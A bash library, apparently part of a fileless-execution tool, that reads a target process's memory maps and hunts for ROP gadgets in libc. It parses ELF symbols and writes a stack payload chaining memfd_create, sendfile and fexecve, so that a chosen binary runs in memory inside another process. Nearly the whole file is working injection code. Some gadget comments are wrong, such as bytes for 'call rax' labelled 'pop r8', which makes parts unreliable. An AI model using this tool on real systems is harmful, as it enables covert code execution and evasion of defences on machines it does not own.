#!/bin/bash

shopt -s lastpipe # used for setting env vars in pipes to limit use of subshells
# https://en.wikipedia.org/wiki/Executable_and_Linkable_Format#File_header

PROGBITS=1
SYMTAB=2
STRTAB=3
DYNSYM=11

declare -A hex
for ((j=1; j < 256; j++)); do
	# we can't set \0 or \x0a in an array, so skip those, and we can check for them later. all other bytes are ok
	[[ $j -eq 10 ]] && continue
	hex[$(echo -ne "\\x$(printf '%x' ${j})")]=${j}
done

tohex() {
	: "basically 'od', convert \x01\x02\x03 to 01 02 03"
	local i
	for ((i=${1}; i > 0; i--)); do
		# above maybe 7b? we accidentally read 2 bytes, so disable unicode
		LC_ALL=C IFS= read -n 1 -d '' -r c
		if [[ -z "$c" ]]; then
			# null byte
			echo -n "00 "
		else
			hexc=${hex[${c}]}
			if [[ ! -z "${hexc}" ]]; then
					printf '%02x ' "${hexc}"
			else
					printf '%02x ' 10
			fi
		fi
	done
}

hexlify() {
	x=$(printf "%016x" "${1}")
	echo -n "\\x${x:14:2}\\x${x:12:2}\\x${x:10:2}\\x${x:8:2}\\x${x:6:2}\\x${x:4:2}\\x${x:2:2}\\x${x:0:2}"
}

write() {
	printf -- "${1}" >> "${2}"
}

filesize() {
	IFS=+ FILESIZE=($(dd if=${1} of=/dev/null bs=1 2>&1))
	FILESIZE=${FILESIZE[0]}
	IFS=
}

getbase() {
	IFS="-" read -a addrs <<< "${1}"
	echo "${addrs[0]}"
}

findregion() {
  : "Don't log the findregion loop"
	IFS=$'\n ' MAPFILE=($(<${MAPS}))
	: "Start at 4 because 0 wont be equal to the region name"
	: "So we can just skip it"
	for ((i=4; i<${#MAPFILE[@]}; i++)); do
		[[ ${MAPFILE[${i}]} = *${1}* && ${MAPFILE[$((${i}-4))]} ]] && break
	done
	BASE=$(getbase ${MAPFILE[$((${i}-5))]})
}

getlibs() {
  : "Don't log the getlibs loop"
	IFS=$'\n' MAPFILE=($(<${MAPS}))
	LIBS=()
	for MAP in ${MAPFILE[@]}; do
		IFS=' ' MAPLINE=(${MAP})
		if [[ "${MAPLINE[1]}" = "r-xp" && "${MAPLINE[5]}" = /* ]]; then
			LIBS+=("${MAPLINE[5]}")
		fi
	done
	echo ${LIBS[@]}
}

getlibc() {
	getlibs | IFS=' ' read -a LIBS
  [[ ! $? -eq 0 ]] && { printf "getlibc: getlibs call failed" >&2 && exit 1 ;}
	for ((i=0; i < ${#LIBS[@]}; i++)); do
		if [[ "${LIBS[${i}]}" = */libc-* ]]; then
			echo "${LIBS[${i}]}"
			return
		fi
	done
}

declare -A gadgetcache
findgadget() {
	if [[ ${gadgetcache[${1}]+FOUND} ]]; then
		# cache hit
		gadgetaddr=${gadgetcache[${1}]}
	else
	# cache miss
	getlibs | read -a LIBS

	# eval splits up the LIBS as args
	# if we don't find one, try to find something in /usr/lib/* and LD_PRELOAD

	matches=()
	match=()
	eval grep -Fao --byte-offset "$1" ${LIBS[@]} | grep -o "^[^:]*:[^:]*" | while IFS=$'\n' read match; do
		IFS=: match=(${match})
		getsect "${match[0]}" ".text" ${PROGBITS} | IFS=' ' read textaddr textsize

		if [[ ${match[1]} -gt ${textaddr} && ${match[1]} -lt $((${textaddr}+${textsize})) ]]; then
			break
		fi
	done

  : "Match: ${match[@]}"
  #printf "findgadget(): Searching in %s\n" "${match[0]}"
	# 0 is file
	# 1 is offset
	if [[ -z "${match[0]}" || -z "${match[1]}" ]]; then
		matches=()
		match=()
		eval grep -Fao --byte-offset "$1" /usr/lib/* 2>/dev/null | grep -o "^[^:]*:[^:]*" | while IFS=$'\n' read match; do
			IFS=: match=(${match})
			getsect "${match[0]}" ".text" ${PROGBITS} | IFS=' ' read textaddr textsize

			if [[ ${match[1]} -gt ${textaddr} && ${match[1]} -lt $((${textaddr}+${textsize})) ]]; then
				break
			fi
		done
		if [[ -z "${match[0]}" ]]; then
			exit 1
		else
			[[ "${PRELOAD[@]}" = *${match[0]}* ]] || PRELOAD+=("${match[0]}")
		fi

		return
	fi

	findregion ${match[0]}
	gadgetaddr=$(hexlify $(($((16#${BASE}))+${match[1]})))
	gadgetcache[${1}]=${gadgetaddr}
	fi #cache miss
}

relocatelibc() {
	findregion "libc-"
  [[ ! $? -eq 0 ]] && { printf "relocatelibc: findregion call failed" >&2 && exit 1 ;}
	hexlify $(($((16#${BASE}))+$((16#${1}))))
  [[ ! $? -eq 0 ]] && { printf "relocatelibc: hexlify call failed" >&2 && exit 1 ;}
}


fnargs() {
	SYSCALLSIZE=0
	SYSCALL=

	findgadget "$(printf "\x58\xc3")"                    # pop rax ; ret
  [[ ! $? -eq 0 ]] && { printf "fnargs: findgadget call failed" >&2 && exit 1 ;}
	SYSCALL=${SYSCALL}${gadgetaddr}
	# when we're called from pltcall, this is already a valid address string
	# otherwise we need to encode it, because it's a syscall id
	if [[ ${1} = \\x* ]]; then
		SYSCALL=${SYSCALL}${1}
	else
		SYSCALL=${SYSCALL}$(hexlify ${1})
	fi
	shift
	SYSCALLSIZE=$((${SYSCALLSIZE}+2))
	[[ -z ${1} ]] && return

	# this is from the x64 Linux ABI
	GADGETS=(
		"\x5f\xc3"     # pop rdi; ret
		"\x5e\xc3"     # pop rsi; ret
		"\x5a\xc3"     # pop rdx; ret
		"\x59\xc3"     # pop rcx; ret
		"\xff\xd0\xc3" # pop r8 ; ret
		"\xff\xd1\xc3" # pop r9 ; ret
		)

	for gadget in ${GADGETS[@]}; do
		findgadget "$(printf ${gadget})"
    [[ ! $? -eq 0 ]] && { printf "fnargs: findgadget call failed" >&2 && exit 1 ;}
		SYSCALL=${SYSCALL}${gadgetaddr}
		SYSCALL=${SYSCALL}$(hexlify ${1})
		shift
		SYSCALLSIZE=$((${SYSCALLSIZE}+2))
		[[ -z ${1} ]] && break
	done
}

# execute a syscall in the ROPChain, with all arguments setup appropriately
syscall() {
	fnargs $@
	findgadget "$(printf "\x0f\x05\xc3")"                # syscall ; ret
  [[ ! $? -eq 0 ]] && { printf "syscall: findgadget call failed" >&2 && exit 1 ;}
	SYSCALL=${SYSCALL}${gadgetaddr}
	SYSCALLSIZE=$((${SYSCALLSIZE}+1))

	# global management
	SLEDLEN=$((${SLEDLEN}-${SYSCALLSIZE}))
	SYSCALLS+=(${SYSCALL})
}

# execute a libc call in the ROPChain, with all arguments setup appropriately
pltcall() {
	[[ -z ${LIBC} ]] && getlibc | read LIBC
	# if we're preparing, we don't want to search for a function which is SLOW
	# we know libc functions will be present
	if [[ "${PREPARE}" = "PREPARE" ]]; then
		SYM=0
	else
		getsym ${LIBC} ${1}
		SYM=$(relocatelibc ${symaddr})
	fi
	shift
	fnargs ${SYM} ${@}

	findgadget "$(printf "\xff\xe0")"                   # jmp rax
	SYSCALL=${SYSCALL}${gadgetaddr}
	SYSCALLSIZE=$((${SYSCALLSIZE}+1))

	# global management
	SLEDLEN=$((${SLEDLEN}-${SYSCALLSIZE}))
	SYSCALLS+=(${SYSCALL})
}

readgeneric() {
	# file, offset, count, echo result
	file=""
	[[ "${1}" != "-" ]] && file="if=${1}"
	IFS=' ' data=($(dd ${file} skip=${2} count=${3} status=none bs=1 | tohex ${3}))

	# reverse to get the correct byte order
	rdata=""
	for ((x=${#data[@]}; x>=0; x--)); do
		rdata=${rdata}${data[${x}]}
	done

	if [[ ! -z ${4} ]]; then
		echo $((16#${rdata}))
	elif [[ ${3} -eq 2 ]]; then
		retshort=$((16#${rdata}))
	elif [[ ${3} -eq 4 ]]; then
		retint=$((16#${rdata}))
	elif [[ ${3} -eq 8 ]]; then
		retlong=$((16#${rdata}))
	else
		echo $((16#${rdata}))
	fi
}

readshort() {
	readgeneric ${1} ${2} 2 ${3}
}

readint() {
	readgeneric ${1} ${2} 4 ${3}
}

readlong() {
	readgeneric ${1} ${2} 8 ${3}
}

getsecstrtab() {
	# return a string from secstrtab
	skip=${1}
	secstr=(${shstrtab:${skip}})
	secstr=${secstr[0]}
}

getstrtab() {
	# return a string from strtab
	skip=${1}
	symstr=(${strtab:${skip}})
	symstr=${symstr[0]}
}

parsesect() {
	# return elements of section struct. name, type, offset and size
	# we are consuming now, so offsets are relevant to the start of the struct to begin
	# and then relative to wherever that element ends
	readint "-" 0
	sh_name=${retint}
	readint "-" 0
	sh_type=${retint}
	readlong "-" $((16#10))
	sh_offset=${retlong}
	readlong "-" 0
	sh_size=${retlong}
}

getsect() {
	LIB="${1}"
	# return offset and size from a section
	genlookup "${LIB}" false

	e_shoff=$(readlong ${LIB} $((16#28)) 1)      # start of the section header table
	e_shnum=$(readshort ${LIB} $((16#3C)) 1)     # number of section header entries
	e_shentsize=$(readshort ${LIB} $((16#3A)) 1) # section header table entry size
	e_shstrndx=$(readshort ${LIB} $((16#3E)) 1)  # index to section names section entry

	shstrtab_offset=$(readlong ${LIB} $((${e_shoff}+$((${e_shstrndx}*${e_shentsize}))+$((16#18)))) 1) # offset to shstrtab
	shstrtab_size=$(readlong ${LIB} $((${e_shoff}+$((${e_shstrndx}*${e_shentsize}))+$((16#20)))) 1) # size of shstrtab

	for ((i=0; i <= $((${e_shnum}-1)); i++)); do
		# read the whole struct in one so we thrash less
		dd if=${1} skip=$((${e_shoff}+$((${i}*${e_shentsize})))) count=$((16#28)) bs=1 status=none | parsesect

		if [[ ! -z "${3}" ]]; then # if a type is specified
			if [[ "${sh_type}" != "${3}" ]]; then # and it's not the same as the current sect
				continue # don't check the name
			fi
		fi

		getsecstrtab "$((${sh_name}+1))"
		if [[ "${secstr}" = "${2}" ]]; then
			echo "${sh_offset} ${sh_size}"
			break
		fi
	done
}

getstrsect() {
	unset strtab_offset strtab_size
	getsect "${1}" ".strtab" ${STRTAB} | read strtab_offset strtab_size
	if [[ ! -z "${strtab_offset}" && ! -z "${strtab_size}" ]]; then
		echo "${strtab_offset} ${strtab_size}"
	else
		getsect "${1}" ".dynstr" ${STRTAB}
	fi
}

getsymsect() {
	unset symtab_offset symtab_size
	getsect "${1}" ".symtab" ${SYMTAB} | read symtab_offset symtab_size
	if [[ ! -z "${symtab_offset}" && ! -z "${symtab_size}" ]]; then
		echo "${symtab_offset} ${symtab_size}"
	else
		getsect "${1}" ".dynsym" ${DYNSYM}
	fi
}

checksym() {
	# start at idx 0 for the first item
	readint "-" 0
	if [[ ${retint} -eq ${2} ]]; then
		symfound="0"
		return
	fi

	# then we jump to idx 20 for the rest of the items
	local i
	for ((i=0; i < $((${1}*24)); i+=24)); do
		readint "-" 20
		if [[ ${retint} -eq ${2} ]]; then
			# +1 for the read at idx 0
			symfound="$(($((${i}/24))+1))"
			break
		fi
	done
}

genlookup() {
	LIB=${1}

	e_shoff=$(readlong ${LIB} $((16#28)) 1)      # start of the section header table
	e_shnum=$(readshort ${LIB} $((16#3C)) 1)     # number of section header entries
	e_shentsize=$(readshort ${LIB} $((16#3A)) 1) # section header table entry size
	e_shstrndx=$(readshort ${LIB} $((16#3E)) 1)  # index to section names section entry

	shstrtab_offset=$(readlong ${LIB} $((${e_shoff}+$((${e_shstrndx}*${e_shentsize}))+$((16#18)))) 1) # offset to shstrtab
	shstrtab_size=$(readlong ${LIB} $((${e_shoff}+$((${e_shstrndx}*${e_shentsize}))+$((16#20)))) 1) # size of shstrtab

	# needs to be global
	shstrtab=
	while IFS= read -r -d '' sect; do
		shstrtab="${shstrtab} ${sect}"
	done < <(dd if=${LIB} skip=${shstrtab_offset} bs=1 count=${shstrtab_size} status=none)

	if [[ -z "${2}" ]]; then
		getstrsect "${LIB}" | IFS=' ' read strtab_offset strtab_size
		strtab=
		while IFS= read -r -d '' sect; do
			strtab="${strtab} ${sect}"
		done < <(dd if=${LIB} skip=${strtab_offset} bs=1 count=${strtab_size} status=none)
		strtab=${strtab:1} # remove the leading space
	fi
}

getsym() {
	# get the address of a symbol
	LIB="${1}"
	genlookup "${LIB}"

	getsymsect "${LIB}" | IFS=' ' read symtab_offset symtab_size
	poststrtab=${strtab%%${2} *}
	[[ "${poststrtab}" = "${strtab}" ]] && idx=-1 || idx=${#poststrtab}

	CHUNKSIZE=2048 # 2048*24 = 49,152 bytes

	# sizeof(elf64_sym) == 24
	for ((i=${symtab_offset}; i <= $((${symtab_offset}+${symtab_size})); i+=$((${CHUNKSIZE}*24)))); do
		dd if=${LIB} skip=${i} count=$((${CHUNKSIZE}*24)) bs=1 status=none | checksym ${CHUNKSIZE} ${idx}

		if [[ -n "${symfound}" ]]; then
			readint ${LIB} $((${i}+$((${symfound}*24))))
			getstrtab ${retint}
			if [[ "${symstr}" = "${2}" ]]; then
				readlong ${LIB}  $((${i}+$((${symfound}*24+8))))
				symaddr=$(printf '%x\n' ${retlong})
				break
			fi
		fi
	done
}

findstr() {
	local OFFSET=${ALLSTRINGS%%$1*}
	local NEGOFFSET=$((${STRINGSSIZE}-${#OFFSET}))
	printf "%s" "${NEGOFFSET}"
}

strptr() {
	if [[ $((${STRINGSSIZE}%8)) -eq 0 ]]; then
		printf "%s" "$(($(($((16#${STACK[1]}))-$(findstr ${1})))))"
	else
		printf "%s" "$(($(($(($((16#${STACK[1]}))-$(findstr ${1})))))-$((8-$((${STRINGSSIZE}%8))))))"
	fi
}

memfdcreate() {
  # each syscall will subtract it's length from the SLEDLEN, so we know how many NOPs to write
  SLEDLEN=$((${PAYLOADSIZE}/8))
  SYSCALLS=()
  
  STRINGS=()
  # argv
  STRINGS+=(${@:2})
  STRINGS+=("")
  
  ALLSTRINGS=${STRINGS[@]}
  STRINGSSIZE=${#ALLSTRINGS}
  
  # string ideas
  # store an array of strings that we want. lookup can be performed using ${#${${ARRAY[@]}%%SEARCH*}}
  # when writing, write each string followed by a \x00, because ${ARRAY[@]} adds in spaces, the indexes should be the same
  
  # This section is LAST, but generated first so we can access the strings
  BINARY=${2}
  
  # memfd_create('ELF...', 0)
  # because 400000 is the start of the ELF binary we're running in
  # and it makes no difference what the string actually is
  syscall 319 $((16#400001)) 0
  
  : "memfdcreate.sh: (1/5) MEMFD_CREATE FOUND"

  # open(${BINARY}, O_RDONLY, 0)
  # where BINARY is the offset from the bottom of the stack to the start of our null terminated string
  STRPTR="$(strptr ${2})"
  syscall 2 ${STRPTR} 0 0
  [[ ! $? -eq 0 ]] && { printf "memfdcreate: syscall call failed" >&2 && exit 1 ;}
  
  : "memfdcreate.sh: (2/5) OPEN FOUND"
  
  filesize ${BINARY}
  # `sleep` would never have more than stdin/stdout/stderr open, so we can reliably guess file descriptors
  # whilst a little hacky, it means we don't have to try and save retvals from functions
  #
  # for some reason, the raw sendfile syscall doesn't read all the data, but the glibc one does
  # so use the glibc one instead
  
  # sendfile(3, 4, 0, BINARYSIZE)
  pltcall "sendfile" 3 4 0 ${FILESIZE}
  [[ ! $? -eq 0 ]] && { printf "memfdcreate: pltcall call failed" >&2 && exit 1 ;}
  
  : "memfdcreate.sh: (3/5) SENDFILE FOUND"
  
  # the two pointers here should be pointers to each element in argv/envp, followed by a null ptr
  # envp currently just uses the null ptr at the end of the argv array, so we don't have to deal with it
  
  # ENVP is easier to work out first
  ENVP=$(($(strptr ${2})-8))
  
  # want to be on the first string, not before it, so add 8 again
  ARGV=$(($((${ENVP}-$((${#STRINGS[@]}*8))))+8))
  
  pltcall "fexecve" 3 ${ARGV} ${ENVP}
  [[ ! $? -eq 0 ]] && { printf "memfdcreate: pltcall call failed" >&2 && exit 1 ;}
  
  : "memfdcreate.sh: (4/5) FEXECVE FOUND"
  
  # exit(0)
  syscall 60 0
  [[ ! $? -eq 0 ]] && { printf "memfdcreate: syscall call failed" >&2 && exit 1 ;}

  : "memfdcreate.sh: (5/5) EXIT FOUND"
  
  if [[ "${PREPARE}" = "PREPARE" ]]; then
  	: "${PRELOAD[@]}"
  	exit
  fi
  
  # char**s +1 to account for the NULL at the end of the array
  SLEDLEN=$((${SLEDLEN}-$((${#STRINGS[@]}+1))))
  # char[]s
  SLEDLEN=$((${SLEDLEN}-$((${STRINGSSIZE}/8))))
  
  : "Writing payload to payload.bin"
  rm -f payload.bin
  for ((i=${SLEDLEN}; i>0; i--)); do
  	write "${NOP}" payload.bin
  done
  
  for SYSCALL in ${SYSCALLS[@]}; do
  	write "${SYSCALL}" payload.bin
  done
  
  # argv array of pointers to char
  for ARG in ${@:2}; do
  	write $(hexlify $(strptr ${ARG})) payload.bin
  done
  write $(hexlify 0) payload.bin
  
  for STRING in ${STRINGS[@]}; do
  	write ${STRING} payload.bin
  	write "\x00" payload.bin
  done
}

get_stack() {
  : "Don't log this loop. We get it..."
  if [ -z "${1}" ]; then
    : "Must send PID as argument"
  fi

  MAPS="/proc/${1}/maps"
  
  if [ -z "${MAPS}" ]; then
    : "Process map for ${1} not found. Fatal error."
    exit 1
  fi
  
  : "Get the index of the phrase '[stack]'"
  IFS=$' \t\n'
  MAPFILE=($(<${MAPS}))
  
  for ((i=0; i<${#MAPFILE[@]}; i++)); do
  	[[ ${MAPFILE[${i}]} = "[stack]" ]] && break
  done
  STACKRANGE=${MAPFILE[$((${i}-5))]}
  : "Found address of stack: ${STACKRANGE}"
  
  IFS="-" read -r -a STACK <<< "${STACKRANGE}"
}

payload() {
  : "Check that payload() has appropriate number of args"
  if [ "${#}" != "2" ] && [ "${#}" != "3" ]; then
    : "payload.sh: Need more args"
    exit 1
  fi
  
  PID=${1}
  if [ "${PID}" == "0" ]; then
    : "PID must be a positive integer"
    exit 1
  fi
  
  PRELOAD=()
  get_stack ${PID}

  PAYLOADSIZE=$(($((16#${STACK[1]}))-$((16#${STACK[0]}))))
  : "Set the payload size to the size of the stack"
  
  # all constant looking things are opcodes from here
  # we get an offset and add it to the ASLR base in findgadget above
  # we use two lines so we don't shell out, it lets us modify global variables
  
  # Find a nop
  findgadget $(printf "\x90\xc3")
  NOP=${gadgetaddr}
  
  if [ -z "${NOP}" ]; then
    : "Couldn't find a NOP instruction."
    : "That probably doesn't matter, but we can't continue without a NOP sled."
    : "(Also, not finding a NOP may indicate something larger has gone wrong.)"
    exit 1
  fi
  : "Found NOP"
  
  memfdcreate "${@}"
}

: "Sourced funcs.sh successfully"
